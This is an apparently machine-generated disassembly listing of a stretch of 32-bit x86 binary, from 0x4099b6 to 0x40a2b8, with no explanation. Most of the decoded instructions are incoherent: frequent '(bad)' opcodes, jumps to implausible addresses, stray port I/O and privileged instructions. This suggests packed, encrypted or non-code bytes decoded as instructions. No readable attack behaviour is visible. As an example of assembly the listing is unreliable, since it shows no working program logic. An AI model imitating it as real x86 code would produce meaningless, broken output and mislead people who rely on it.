  4099b6:	(bad)  
  4099b7:	jne    0x409948
  4099b9:	fnstsw WORD PTR [edx*4+0x75fefa1c]
  4099c0:	cli    
  4099c1:	scas   eax,DWORD PTR es:[edi]
  4099c2:	push   ss
  4099c3:	jne    0x4099c5
	...
  4099d5:	add    dh,bh
  4099d7:	ret    
  4099d8:	rcl    DWORD PTR [ebp+eiz*2+0x6a7516ca],1
  4099df:	rcl    BYTE PTR [eax+0x7102620b],cl
  4099e5:	dec    DWORD PTR [ebp-0x1e]
  4099e8:	nop
  4099e9:	not    DWORD PTR [edx+0x2f]
  4099ec:	jnp    0x4099ed
  4099ee:	cmp    eax,0x22f390f2
  4099f3:	inc    edi
  4099f4:	jnp    0x4099f5
  4099f6:	sub    eax,0x12ef9102
  4099fb:	aas    
  4099fc:	jnp    0x4099fd
  4099fe:	sbb    eax,0x5ff0a62
  409a03:	mov    eax,ds:0x220dfea8
  409a08:	cmp    BYTE PTR [ebp+0x16],0x1b
  409a0c:	(bad)  
  409a0d:	sbb    eax,0x75161b90
  409a12:	push   es
  409a13:	inc    esi
  409a14:	outs   dx,DWORD PTR ds:[esi]
  409a15:	xchg   esp,eax
  409a16:	in     eax,dx
  409a17:	aas    
  409a18:	test   eax,0x7d1e4ff
  409a1d:	call   0xff565492
  409a22:	pusha  
  409a23:	push   ds
  409a24:	push   ss
  409a25:	jne    0x409a25
  409a27:	inc    ebp
  409a28:	adc    DWORD PTR [ebp+eax*8-0x418ae999],0x76
  409a30:	es xchg edi,eax
  409a32:	mov    ch,0x77
  409a34:	lds    ecx,FWORD PTR [edx]
  409a36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a37:	das    
  409a38:	cmp    BYTE PTR [ebp+0x0],0x0
	...
  409a4b:	add    BYTE PTR [edi+eax*4+0x553c5f16],ah
  409a52:	inc    ecx
  409a53:	adc    dl,bh
  409a55:	lock mov ch,ah
  409a58:	jns    0x409ac4
  409a5a:	pop    ds
  409a5b:	push   esi
  409a5c:	test   DWORD PTR ds:0x78920bdc,eax
  409a62:	outs   dx,BYTE PTR ds:[esi]
  409a63:	push   ss
  409a64:	jne    0x409ae4
  409a66:	lods   al,BYTE PTR ds:[esi]
  409a67:	vmwrite edx,DWORD PTR [edx-0x5170cac]
  409a6e:	add    BYTE PTR [edx+edi*8],0x4
  409a72:	jmp    0xe183dd2c
  409a77:	add    ecx,DWORD PTR [ebp-0x66]
  409a7a:	loopne 0x409aa7
  409a7c:	addr16 jbe 0x409aa5
  409a7f:	push   ss
  409a80:	xor    eax,0xfa0420ca
  409a85:	add    al,0xe9
  409a87:	mov    BYTE PTR [edi-0x50e946f4],dh
  409a8d:	cld    
  409a8e:	adc    dh,bl
  409a90:	mov    edx,DWORD PTR [eax]
  409a92:	dec    BYTE PTR [ebx-0x6795ef41]
  409a98:	add    eax,0x79077505
  409a9d:	xchg   edx,eax
  409a9e:	in     al,0x2
  409aa0:	mov    BYTE PTR [esi],al
  409aa2:	push   0xffffff97
  409aa4:	icebp  
  409aa5:	push   es
  409aa6:	pop    edi
  409aa7:	or     dh,BYTE PTR [edx-0x5fc16fb]
  409aad:	scas   al,BYTE PTR es:[edi]
  409aae:	scas   eax,DWORD PTR es:[edi]
  409aaf:	inc    edx
	...
  409ac0:	add    BYTE PTR [eax],al
  409ac2:	repnz add al,0x6c
  409ac5:	mov    edi,0x8fb5b4cd
  409aca:	cmc    
  409acb:	sbb    al,0xad
  409acd:	jae    0x409a94
  409acf:	punpckhdq mm2,QWORD PTR [edi+0x1504c5]
  409ad6:	add    DWORD PTR [ebp+0x1d],eax
  409ad9:	or     dh,BYTE PTR [edx+0x5]
  409adc:	jmp    0xafef94e4
  409ae1:	inc    edx
  409ae2:	repnz add al,0x6a
  409ae5:	xchg   edi,eax
  409ae6:	xchg   ecx,eax
  409ae7:	or     DWORD PTR [eax],eax
  409ae9:	sti    
  409aea:	xchg   BYTE PTR [eax-0x62b18ebb],al
  409af0:	pop    ss
  409af1:	ins    WORD PTR es:[edi],dx
  409af3:	pop    es
  409af4:	call   0xff5086ba
  409af9:	lods   eax,DWORD PTR fs:[esi]
  409afb:	pop    ss
  409afc:	push   eax
  409afd:	dec    esi
  409afe:	jne    0x409b07
  409b00:	call   0xff508436
  409b05:	jo     0x409a9c
  409b07:	and    ebp,ebx
  409b09:	aam    0x74
  409b0b:	leave  
  409b0c:	neg    DWORD PTR [ecx+0x110799ee]
  409b12:	scas   eax,DWORD PTR es:[edi]
  409b13:	jne    0x409b14
  409b15:	push   ds
  409b16:	or     ecx,0x176d64e3
  409b1c:	push   eax
  409b1d:	and    DWORD PTR ds:0xd1f1750e,0xffffffda
  409b24:	xchg   ecx,eax
  409b25:	inc    BYTE PTR [eax]
	...
  409b37:	add    dh,ch
  409b39:	add    DWORD PTR [ebp-0xf],0xe1750e49
  409b40:	shl    DWORD PTR [ebx],1
  409b42:	cli    
  409b43:	out    0xe6,al
  409b45:	cmp    DWORD PTR [ebp-0x3b],0xfffffff8
  409b49:	xchg   edi,eax
  409b4a:	sbb    eax,0x5016ac64
  409b4f:	into   
  409b50:	je     0x409b5c
  409b52:	(bad)  
  409b53:	cmp    al,0xf2
  409b55:	or     eax,0x5f21f175
  409b5a:	std    
  409b5b:	mov    dh,0xe6
  409b5d:	jg     0x409ba4
  409b5f:	mov    cl,0x89
  409b61:	pcmpeqw mm6,mm1
  409b64:	adc    DWORD PTR [esi-0x6],ebx
  409b67:	sahf   
  409b68:	push   cs
  409b69:	cmp    BYTE PTR [ebp-0x6f],0xf9
  409b6d:	xchg   edi,eax
  409b6e:	or     DWORD PTR [ecx-0x7],edx
  409b71:	add    al,0x0
  409b73:	add    BYTE PTR [ebx-0x743d37a8],dl
  409b79:	add    cl,BYTE PTR [ebp-0x1adf4bb]
  409b7f:	jne    0x409b98
  409b81:	stc    
  409b82:	je     0x409b90
  409b84:	adc    al,0x7f
  409b86:	pop    es
  409b87:	call   0x3f926f
  409b8c:	loopne 0x409c04
  409b8e:	test   DWORD PTR [eax],0xb7fc4e
  409b94:	push   ebx
  409b95:	add    al,BYTE PTR [eax]
  409b97:	pop    esi
  409b98:	or     al,ah
  409b9a:	pop    es
	...
  409bab:	add    BYTE PTR [eax],al
  409bad:	add    dh,dl
  409baf:	dec    esi
  409bb0:	not    DWORD PTR [eax+0x14]
  409bb3:	jg     0x409bbc
  409bb5:	call   0x3f2f15
  409bba:	test   al,0xf1
  409bbc:	call   0x42bfbc
  409bc1:	dec    DWORD PTR [esi-0x3e181806]
  409bc7:	clc    
  409bc8:	(bad)  
  409bc9:	cmp    ebx,DWORD PTR [esi-0x2]
  409bcc:	je     0x409bd3
  409bce:	cli    
  409bcf:	add    BYTE PTR [eax],al
  409bd1:	add    BYTE PTR [ebx],dl
  409bd3:	test   DWORD PTR [ebp-0x4],edi
  409bd6:	or     eax,0x1e8d2378
  409bdb:	add    DWORD PTR [eax-0x1],edx
  409bde:	dec    esi
  409bdf:	adc    edi,esp
  409be1:	or     eax,0x8dfef262
  409be6:	push   cs
  409be7:	add    DWORD PTR [eax-0x1],edx
  409bea:	push   cs
  409beb:	adc    edi,esp
  409bed:	cmp    cl,BYTE PTR [ecx+0x1e8dfef1]
  409bf3:	add    DWORD PTR [eax-0x1],edx
  409bf6:	ficom  WORD PTR [eax]
  409bf8:	out    0x2e,eax
  409bfa:	pop    ecx
  409bfb:	icebp  
  409bfc:	dec    BYTE PTR [ebp+0x500be0fa]
  409c02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c03:	clc    
  409c04:	sti    
  409c05:	out    0xc9,eax
  409c07:	adc    BYTE PTR [ebx],0xff
  409c0a:	sub    eax,0x13
  409c0d:	lea    esi,[edi]
  409c0f:	xchg   esp,eax
  409c10:	mov    bl,0xfe
	...
  409c22:	add    BYTE PTR [eax],al
  409c24:	(bad)  
  409c26:	sbb    eax,esp
  409c28:	and    DWORD PTR [esi-0x404076ee],0x4b724580
  409c32:	adc    dh,BYTE PTR [ebp-0xe]
  409c35:	ret    
  409c36:	pop    eax
  409c37:	sti    
  409c38:	pop    ebp
  409c39:	(bad)  
  409c3a:	jl     0x409c81
  409c3c:	bound  ebx,QWORD PTR [edx+0x4ffaef90]
  409c42:	xchg   esi,eax
  409c43:	add    bh,0xcf
  409c46:	add    esi,DWORD PTR [edi+ecx*8-0x66]
  409c4a:	nop
  409c4b:	out    0xfa,eax
  409c4d:	ja     0x409bf9
  409c4f:	sub    BYTE PTR [edi-0x648bfc0d],0x83
  409c56:	jmp    0x125c5796
  409c5b:	jne    0x409c67
  409c5d:	repz dec esi
  409c5f:	push   0xbffe1bfa
  409c64:	(bad)  
  409c65:	cmp    eax,0xdcbe149b
  409c6a:	add    edi,edi
  409c6c:	outs   dx,DWORD PTR ds:[esi]
  409c6d:	sbb    ebp,DWORD PTR cs:[edx+0xb031e62]
  409c74:	mov    edx,0xff6800b1
  409c79:	add    ebp,eax
  409c7b:	call   esp
  409c7d:	rcl    DWORD PTR [ebx],1
  409c7f:	call   0x4462f7
  409c84:	icebp  
  409c85:	pop    ebp
  409c86:	xchg   edi,eax
  409c87:	sub    eax,0x0
	...
  409c98:	add    BYTE PTR [eax],al
  409c9a:	push   edx
  409c9b:	add    eax,0x4ba503e9
  409ca0:	sahf   
  409ca1:	cwde   
  409ca2:	add    DWORD PTR ds:0xca5761c,ebx
  409ca8:	mov    ds,WORD PTR [eax-0x3f373]
  409cae:	popf   
  409caf:	cmp    DWORD PTR [ebx+0x12],ebx
  409cb2:	lea    ecx,[esp+edi*8]
  409cb5:	pop    ds
  409cb6:	test   DWORD PTR [edx+0x77bb1bdc],edx
  409cbc:	data16 adc dh,BYTE PTR [ebp-0x6e]
  409cc0:	push   eax
  409cc1:	adc    ah,bh
  409cc3:	clc    
  409cc4:	inc    eax
  409cc5:	pop    ecx
  409cc6:	mov    BYTE PTR [esi+ecx*2],cl
  409cc9:	adc    ah,bh
  409ccb:	adc    al,0x51
  409ccd:	inc    esi
  409cce:	outs   dx,DWORD PTR ds:[esi]
  409ccf:	or     al,0x3e
  409cd1:	adc    al,bh
  409cd3:	sbb    BYTE PTR [ecx+0x4e],al
  409cd6:	outs   dx,DWORD PTR ds:[esi]
  409cd7:	or     al,0x2e
  409cd9:	adc    al,bh
  409cdb:	sbb    al,0x11
  409cdd:	push   esi
  409cde:	(bad)  
  409cdf:	or     al,0x1e
  409ce1:	sar    DWORD PTR [eax-0x76],0x10
  409ce5:	add    ebp,DWORD PTR [esi-0x12e61e04]
  409ceb:	cmp    esi,0x720c1510
  409cf1:	enter  0xab05,0x1f
  409cf5:	inc    ebp
  409cf6:	repnz add al,0x94
  409cf9:	jle    0x409d09
  409cfb:	mov    BYTE PTR [ebp+0x10],ch
	...
  409d0d:	add    BYTE PTR [eax],al
  409d0f:	add    ch,dh
  409d11:	xchg   ecx,eax
  409d12:	in     al,dx
  409d13:	sbb    eax,DWORD PTR [ecx+0x4d]
  409d16:	(bad)  
  409d17:	adc    ecx,esi
  409d19:	inc    esp
  409d1a:	push   esp
  409d1b:	shr    DWORD PTR [esi-0x3f],1
  409d1e:	les    esi,FWORD PTR [ebp+ebx*8-0x32ee92cb]
  409d25:	or     eax,DWORD PTR [eax]
  409d27:	cmp    al,0xea
  409d29:	or     esi,DWORD PTR [ebp-0x23]
  409d2c:	loope  0x409d81
  409d2e:	mov    fs,WORD PTR [esi+0x15c0000b]
  409d34:	stos   DWORD PTR es:[edi],eax
  409d35:	or     dh,BYTE PTR [ebp-0x1f]
  409d38:	or     dl,BYTE PTR [edx+0x97381fb]
  409d3e:	inc    DWORD PTR [esi-0x268ab469]
  409d44:	jno    0x409d51
  409d46:	jbe    0xddb5a974
  409d4c:	jmp    0xff53:0xd8510791
  409d53:	pop    esi
  409d54:	or     edx,DWORD PTR [edx+0x78b641fb]
  409d5a:	dec    DWORD PTR [esi+0x21]
  409d5d:	inc    edi
  409d5e:	or     cl,ch
  409d60:	mov    WORD PTR [esi-0x14],?
  409d63:	push   0x36fe50c2
  409d68:	jmp    0x409dad
  409d6a:	test   DWORD PTR [ecx-0x18],esi
  409d6d:	or     edi,edi
  409d6f:	jmp    0x7240a26d
	...
  409d84:	add    BYTE PTR [eax],al
  409d86:	xor    eax,0x82290aff
  409d8b:	add    BYTE PTR [eax+0x491f9d1],al
  409d91:	adc    BYTE PTR [ecx+0x4],cl
  409d94:	add    cl,ch
  409d96:	jmp    0xff64:0xfa010b91
  409d9d:	out    dx,al
  409d9e:	dec    BYTE PTR [edx+0x75]
  409da1:	not    BYTE PTR [ecx-0x9d7d39b]
  409da7:	or     DWORD PTR [ebp-0x1b],esi
  409daa:	add    DWORD PTR [eax+ebx*4-0x32],ebx
  409dae:	or     bl,BYTE PTR [esi]
  409db0:	or     eax,0x2b9f2b00
  409db5:	inc    ecx
  409db6:	jecxz  0x409dad
  409db8:	je     0x409dc6
  409dba:	mov    ebx,0x8cff9798
  409dbf:	pop    DWORD PTR [eax+edi*4+0x68fef55d]
  409dc6:	int    0x7
  409dc8:	add    BYTE PTR [eax],al
  409dca:	push   ds
  409dcb:	add    edx,0xfffffffe
  409dce:	ins    BYTE PTR es:[edi],dx
  409dcf:	cmc    
  409dd0:	dec    edi
  409dd1:	call   0x3f3187
  409dd6:	push   ds
  409dd7:	add    edx,0xfffffffe
  409dda:	or     al,0xf5
  409ddc:	dec    edi
  409ddd:	inc    esi
  409ddf:	mov    ebp,0xeddcfffd
  409de4:	dec    ebp
  409de5:	data16 arpl WORD PTR [esi],ax
  409de8:	mov    DWORD PTR [ebp+0x0],eax
	...
  409dfa:	add    BYTE PTR [eax],al
  409dfc:	(bad)  
  409dfd:	hlt    
  409dfe:	(bad)  
  409dff:	call   DWORD PTR [ebx+0x63f38405]
  409e05:	push   es
  409e06:	add    BYTE PTR [ebp-0x2405a],cl
  409e0c:	or     al,0xed
  409e0e:	add    DWORD PTR [eax],edx
  409e10:	push   ebx
  409e11:	push   es
  409e12:	add    BYTE PTR [esi+ebx*2-0x75],dh
  409e16:	inc    ecx
  409e17:	sub    al,0x73
  409e19:	outs   dx,BYTE PTR ds:[esi]
  409e1a:	fwait
  409e1b:	sub    al,0x52
  409e1d:	push   es
  409e1e:	call   0x47134e
  409e23:	or     esp,ebx
  409e25:	jb     0x409e2b
  409e27:	jmp    0x40a3d6
  409e2c:	sahf   
  409e2d:	xchg   edx,eax
  409e2e:	sar    esi,0xc
  409e31:	cli    
  409e32:	mov    WORD PTR [edx+0xf],es
  409e35:	push   ecx
  409e36:	addr16 sahf 
  409e38:	(bad)  
  409e39:	aas    
  409e3a:	jmp    edi
  409e3c:	cli    
  409e3d:	and    DWORD PTR [ebp+0x4326ddff],esp
  409e43:	jne    0x409e44
  409e45:	xor    al,0x80
  409e47:	add    dl,bh
  409e49:	sbb    ecx,DWORD PTR [esi]
  409e4b:	jne    0x409e43
  409e4d:	inc    ebx
  409e4e:	mov    al,ds:0xfb5abd9e
  409e53:	mov    edi,0xaf9b132f
  409e58:	loop   0x409e36
  409e5a:	add    edi,edi
  409e5c:	das    
  409e5d:	and    BYTE PTR [ebx],bl
  409e5f:	or     DWORD PTR [eax],eax
	...
  409e71:	add    BYTE PTR [edx+0xeb0f7a],al
  409e77:	test   BYTE PTR [ebx],0xff
  409e7a:	pop    es
  409e7b:	sbb    BYTE PTR [ebx],bl
  409e7d:	std    
  409e7e:	ins    DWORD PTR es:[edi],dx
  409e7f:	xchg   edx,eax
  409e80:	push   cs
  409e81:	lea    esp,[edi+0x5d]
  409e84:	push   cs
  409e85:	push   DWORD PTR [ebp-0x70]
  409e88:	mov    cl,0x2b
  409e8a:	enter  0x1b4b,0x41
  409e8e:	xor    BYTE PTR [edx+0x305d500e],0xf3
  409e95:	dec    edi
  409e96:	push   ebp
  409e97:	dec    eax
  409e98:	sti    
  409e99:	out    0x50,eax
  409e9b:	leave  
  409e9c:	push   cs
  409e9d:	call   DWORD PTR [edx+0xf]
  409ea0:	ja     0x409ea1
  409ea2:	cmp    eax,0xb88cc2c6
  409ea7:	das    
  409ea8:	jl     0x409e2f
  409eaa:	jmpw   0x9dbc
  409eae:	and    eax,0x67fef368
  409eb3:	scas   eax,DWORD PTR es:[edi]
  409eb4:	or     eax,0x4ef315ff
  409eb9:	data16 cli 
  409ebb:	sbb    edi,edx
  409ebd:	mov    edi,0xaf9b438e
  409ec2:	rcr    BYTE PTR [ebx+eax*1-0x1],cl
  409ec6:	outs   dx,DWORD PTR ds:[esi]
  409ec7:	add    eax,0x70ab1bf5
  409ecc:	fimul  WORD PTR [esi]
  409ece:	in     eax,0x52
  409ed0:	popf   
  409ed1:	or     eax,0x1c3908dd
	...
  409ee6:	add    BYTE PTR [eax],al
  409ee8:	shl    DWORD PTR [eax-0x3a],cl
  409eeb:	push   cs
  409eec:	sub    dh,BYTE PTR [ebp+0x1cfd98bd]
  409ef2:	dec    ecx
  409ef3:	push   cs
  409ef4:	mov    ebp,0x8916c108
  409ef9:	or     BYTE PTR [esi-0x60bc8880],ah
  409eff:	push   cs
  409f00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f01:	mov    ch,0x95
  409f03:	pop    eax
  409f04:	pop    esi
  409f05:	pop    es
  409f06:	mov    cs,WORD PTR [esi]
  409f08:	mov    ds:0xfa040b9a,al
  409f0d:	sub    DWORD PTR [ecx+0x75ed7efe],0x34087d0e
  409f17:	dec    edi
  409f18:	je     0x409f22
  409f1a:	sbb    bx,dx
  409f1d:	mov    eax,ds:0x526503e8
  409f22:	xchg   ecx,eax
  409f23:	or     eax,0x4641085d
  409f28:	imul   ecx,DWORD PTR [eax],0xf9383c46
  409f2e:	call   0x685a0feb
  409f33:	inc    edi
  409f34:	mov    al,BYTE PTR [edi]
  409f36:	cs push cs
  409f38:	cmp    eax,0x2d0d6182
  409f3d:	or     cl,ch
  409f3f:	add    edi,edx
  409f41:	add    al,0x62
  409f43:	enter  0xfbf1,0x28
  409f47:	xchg   edi,eax
  409f48:	inc    BYTE PTR [ecx+eax*8+0x3]
	...
  409f5b:	add    BYTE PTR [eax],al
  409f5d:	add    BYTE PTR [edi-0x503efff],al
  409f63:	add    al,0x0
  409f65:	jmp    0xa86d04cb
  409f6a:	stc    
  409f6b:	pop    es
  409f6c:	jne    0x409f63
  409f6e:	adc    esi,edx
  409f70:	xchg   esi,eax
  409f71:	fdivrp st(7),st
  409f73:	jge    0x409efa
  409f75:	xchg   ecx,eax
  409f76:	in     al,dx
  409f77:	pop    es
  409f78:	inc    DWORD PTR [ecx-0x3c]
  409f7b:	add    al,0x0
  409f7d:	jmp    0xc00321ce
  409f82:	test   DWORD PTR [edi],0x7421c150
  409f88:	jmp    FWORD PTR [esi-0x583d7dcb]
  409f8e:	inc    DWORD PTR [edi]
  409f90:	push   eax
  409f91:	sahf   
  409f92:	dec    ebp
  409f93:	dec    ebp
  409f94:	(bad)  
  409f95:	xchg   esi,eax
  409f96:	out    dx,eax
  409f97:	sbb    al,0xe5
  409f99:	add    eax,0x6c8904fe
  409f9e:	sub    al,BYTE PTR [edi]
  409fa0:	(bad)  
  409fa1:	jle    0x409f61
  409fa3:	test   BYTE PTR [ebx+0x4f6af],0x5c
  409faa:	in     eax,dx
  409fab:	inc    edx
  409fac:	(bad)  
  409fad:	dec    WORD PTR [edi]
  409fb0:	add    bh,cl
  409fb2:	stc    
  409fb3:	add    al,0x0
  409fb5:	out    0x75,al
  409fb7:	ja     0x409fb9
  409fb9:	jmp    0x2bd619b7
  409fbe:	cld    
  409fbf:	pop    es
  409fc0:	jmp    FWORD PTR [eax+eax*1+0x0]
	...
  409fd4:	cmp    bl,bl
  409fd6:	dec    edi
  409fd7:	ror    ebp,0xd8
  409fda:	inc    eax
  409fdb:	jmp    0xe9a4ecf1
  409fe0:	stc    
  409fe1:	sti    
  409fe2:	mov    edi,0x751bfb94
  409fe7:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  409fe9:	inc    edx
  409fea:	dec    BYTE PTR [esi]
  409fec:	pop    es
  409fed:	jp     0x40a031
  409fef:	add    BYTE PTR [edi],ah
  409ff1:	push   ebx
  409ff2:	addr16 sahf 
  409ff4:	aaa    
  409ff5:	inc    edx
  409ff6:	jmp    edi
  409ff8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ff9:	pop    esp
  409ffa:	(bad)  
  409ffb:	(bad)  
  409ffc:	fadd   st,st(2)
  409ffe:	je     0x40a002
  40a000:	enter  0x8c5d,0x95
  40a004:	xchg   ecx,eax
  40a005:	clc    
  40a006:	(bad)  
  40a007:	call   DWORD PTR [esi+0x44]
  40a00a:	sub    ecx,DWORD PTR [ecx-0x251a2]
  40a010:	mov    ah,0x6a
  40a012:	scas   eax,DWORD PTR es:[edi]
  40a013:	sub    BYTE PTR [edx],dl
  40a015:	add    edi,edi
  40a017:	jne    0x409ff0
  40a019:	jmp    0xb5fe:0xf9649698
  40a020:	dec    edi
  40a021:	clc    
  40a022:	(bad)  
  40a023:	jmp    ebx
  40a025:	call   0xf9c5370a
  40a02a:	mov    BYTE PTR [ebp-0x107cd],al
  40a030:	repz push 0xd23c2c
  40a036:	push   DWORD PTR [ebp+0x0]
	...
  40a048:	add    BYTE PTR [eax],al
  40a04a:	ret    
  40a04b:	idiv   esi
  40a04d:	(bad)  
  40a04e:	jnp    0x40a0c5
  40a050:	add    BYTE PTR fs:[ebx+0xd],ah
  40a054:	mov    edi,0x326a6074
  40a059:	cmp    al,0x92
  40a05b:	add    bh,bh
  40a05d:	mov    ch,0x73
  40a05f:	clc    
  40a060:	(bad)  
  40a061:	push   DWORD PTR [esi+ebp*2-0x8c517f9]
  40a068:	(bad)  
  40a069:	(bad)  
  40a06a:	mov    ebx,0xe4ff91bc
  40a06f:	xchg   BYTE PTR [edx+eax*8+0x50fef8d5],al
  40a076:	add    al,0xaf
  40a078:	mov    ebx,0xbeefafe
  40a07d:	call   0x44204d
  40a082:	ja     0x40a060
  40a084:	sti    
  40a085:	test   BYTE PTR [edi-0x200f4fa],bh
  40a08b:	enter  0xfe4e,0xf5
  40a08f:	push   ss
  40a090:	sbb    ah,BYTE PTR [esi+edx*2]
  40a093:	sbb    al,0x3
  40a095:	jmp    FWORD PTR [edi-0x2200f59d]
  40a09b:	inc    ebx
  40a09c:	jg     0x40a030
  40a09e:	aad    0x36
  40a0a0:	cmp    eax,0xb01c02c2
  40a0a5:	mov    dl,dh
  40a0a7:	inc    esi
  40a0a8:	xchg   ecx,eax
  40a0a9:	or     edx,edx
  40a0ab:	bound  esi,QWORD PTR [edx-0x1]
	...
  40a0be:	add    BYTE PTR [eax],al
  40a0c0:	mov    ch,0x22
  40a0c2:	inc    ebx
  40a0c3:	je     0x40a0c2
  40a0c5:	retf   
  40a0c6:	mov    bl,0xfe
  40a0c8:	das    
  40a0c9:	adc    al,0x1b
  40a0cb:	stos   DWORD PTR es:[edi],eax
  40a0cc:	pushf  
  40a0cd:	outs   dx,BYTE PTR ds:[esi]
  40a0ce:	or     ebp,eax
  40a0d0:	and    ecx,DWORD PTR [edx+0x59c3ff0a]
  40a0d6:	cld    
  40a0d7:	jmp    FWORD PTR [esi]
  40a0d9:	xchg   ebx,eax
  40a0da:	pop    ss
  40a0db:	xor    DWORD PTR [esi-0x1c006271],0x3c
  40a0e2:	or     dh,BYTE PTR [ebp+0x2]
  40a0e5:	mov    ah,0x7e
  40a0e7:	(bad)  
  40a0e8:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40a0ea:	jl     0x40a131
  40a0ec:	pop    esi
  40a0ed:	inc    ecx
  40a0ee:	in     eax,dx
  40a0ef:	dec    bh
  40a0f1:	and    ebx,DWORD PTR [ebx]
  40a0f3:	mov    edi,0x6a0abe4d
  40a0f8:	sbb    edi,eax
  40a0fa:	nop
  40a0fb:	pop    es
  40a0fc:	push   edx
  40a0fd:	mov    BYTE PTR [edx],cl
  40a0ff:	push   DWORD PTR ds:0xa7fee741
  40a105:	add    al,0xf1
  40a107:	sbb    edx,DWORD PTR [ecx+0x5]
  40a10a:	push   ds
  40a10b:	or     edx,DWORD PTR [eax-0x2e4f7efc]
  40a111:	ret    
  40a112:	call   0xa8096fb2
  40a117:	add    eax,DWORD PTR ds:0xbadcbdcf
  40a11d:	add    al,0x1
  40a11f:	xlat   BYTE PTR ds:[ebx]
  40a120:	mov    es,WORD PTR [esi+ebp*8]
  40a123:	inc    BYTE PTR [eax]
	...
  40a135:	add    BYTE PTR [ebp+0x5db3fd79],ch
  40a13b:	cmp    BYTE PTR ds:0xd654ddc5,bl
  40a141:	nop
  40a142:	std    
  40a143:	in     al,dx
  40a144:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a145:	pop    es
  40a146:	int    0x4
  40a148:	rol    DWORD PTR [esi],1
  40a14a:	push   0xbd9dbe04
  40a14f:	ins    BYTE PTR es:[edi],dx
  40a150:	dec    esp
  40a151:	enter  0x53a,0x41
  40a155:	leave  
  40a156:	icebp  
  40a157:	inc    ebp
  40a158:	jmp    0xd0849067
  40a15d:	les    ebx,FWORD PTR [ebp-0x6a8f1314]
  40a163:	add    al,0xe2
  40a165:	inc    ebx
  40a166:	push   es
  40a167:	sbb    DWORD PTR [ecx],ebx
  40a169:	pushf  
  40a16a:	enter  0x2840,0x4
  40a16e:	sub    al,BYTE PTR [esp+edi*8]
  40a171:	sti    
  40a172:	pop    ebp
  40a173:	xchg   edi,eax
  40a174:	ins    BYTE PTR es:[edi],dx
  40a175:	or     ch,BYTE PTR [ebp-0x13]
  40a178:	cmp    al,0x74
  40a17a:	gs add al,0xd3
  40a17d:	add    edx,eax
  40a17f:	add    al,0xc1
  40a181:	xchg   edx,eax
  40a182:	adc    DWORD PTR [esi-0x17],eax
  40a185:	fwait
  40a186:	dec    ebp
  40a187:	add    al,0xe9
  40a189:	adc    DWORD PTR [edx-0x22],0x54
  40a18d:	or     bh,BYTE PTR ds:0x85290010
  40a193:	sub    BYTE PTR [eax-0x67],dl
  40a196:	adc    DWORD PTR [ebx+ebx*4+0x26],eax
	...
  40a1a9:	add    BYTE PTR [eax],al
  40a1ab:	add    al,dh
  40a1ad:	xadd   BYTE PTR [ebp-0x2597abf3],dl
  40a1b4:	cmp    eax,0xb90045
  40a1b9:	jp     0x40a1c3
  40a1bb:	adc    DWORD PTR [ebp+0x0],ebx
  40a1be:	(bad)  
  40a1bf:	(bad)  
  40a1c0:	loopne 0x40a164
  40a1c2:	nop
  40a1c3:	test   BYTE PTR [ebx],0xed
  40a1c6:	cwde   
  40a1c7:	pop    eax
  40a1c8:	add    BYTE PTR [edi+edi*8],al
  40a1cb:	pop    esp
  40a1cc:	repnz add esi,DWORD PTR [ebp-0xf]
  40a1d0:	add    DWORD PTR [ecx],edx
  40a1d2:	(bad)  
  40a1d3:	(bad)  
  40a1d4:	add    ecx,esi
  40a1d6:	shl    ebp,0xf9
  40a1d9:	pop    ecx
  40a1da:	mov    edx,ebp
  40a1dc:	jns    0x40a1a6
  40a1de:	jmp    0x40a196
  40a1e0:	repz add ecx,DWORD PTR [ebp-0xaafdd4]
  40a1e7:	xor    al,0xa6
  40a1e9:	add    dh,BYTE PTR [ebp-0xb]
  40a1ec:	add    edi,edx
  40a1ee:	(bad)  
  40a1ef:	jmp    0xe700b1ed
  40a1f4:	adc    al,0xd0
  40a1f6:	(bad)  
  40a1f7:	call   0x81856df5
  40a1fc:	inc    BYTE PTR [eax+eax*1]
  40a1ff:	jmp    0x7734ec3e
  40a204:	sti    
  40a205:	add    al,0x0
  40a207:	add    esi,esi
  40a209:	outs   dx,BYTE PTR ds:[esi]
  40a20a:	add    bl,dl
  40a20c:	stc    
  40a20d:	outs   dx,BYTE PTR ds:[esi]
  40a20e:	add    BYTE PTR [eax+eax*1+0x0],ch
	...
  40a222:	popf   
  40a223:	test   DWORD PTR [edi+0x64],0x4ef6f8d5
  40a22a:	add    edx,DWORD PTR [ebp-0x1]
  40a22d:	add    BYTE PTR [esi-0x8a00f1],al
  40a233:	and    BYTE PTR [ebx+eiz*2-0x3ff4f8dd],ah
  40a23a:	addr16 add ch,al
  40a23d:	mov    ss,WORD PTR [ebx]
  40a23f:	pop    es
  40a240:	add    BYTE PTR [eax-0x3d],ch
  40a243:	loopne 0x40a284
  40a245:	add    ah,ch
  40a247:	xchg   ebx,eax
  40a248:	push   cs
  40a249:	call   0x401722
  40a24e:	arpl   WORD PTR [eax+0x14968dd0],ax
  40a254:	idiv   edi
  40a256:	in     al,dx
  40a257:	mov    dh,0x50
  40a259:	call   0x401782
  40a25e:	push   0xffffff83
  40a260:	lock idiv DWORD PTR [ebp+ecx*1+0xd520de8]
  40a268:	jmp    FWORD PTR [edx-0x1d]
  40a26b:	sahf   
  40a26c:	mov    ebx,0xff09123c
  40a271:	mov    ch,0x83
  40a273:	adc    eax,0x936cffff
  40a278:	or     ch,al
  40a27a:	shl    DWORD PTR [edx-0x1],cl
  40a27d:	jmp    FWORD PTR [edx]
  40a27f:	sub    esp,0xfffffff7
  40a282:	jl     0x40a291
  40a284:	cmp    DWORD PTR [ebp+0x0],0x0
	...
  40a297:	add    BYTE PTR [edi+0x15],bh
  40a29a:	(bad)  
  40a29b:	jmp    DWORD PTR [ebx-0x6d97ee6e]
  40a2a1:	push   es
  40a2a2:	out    dx,eax
  40a2a3:	mov    esi,0xf7ec52fc
  40a2a8:	in     al,dx
  40a2a9:	or     al,0xff
  40a2ab:	jne    0x40a308
  40a2ad:	push   ds
  40a2ae:	xchg   edi,eax
  40a2af:	mov    dl,0xdc
  40a2b1:	or     al,0xff
  40a2b3:	mov    ch,0xaf
  40a2b5:	adc    al,0xff
  40a2b7:	(bad)  
  40a2b8:	cli    
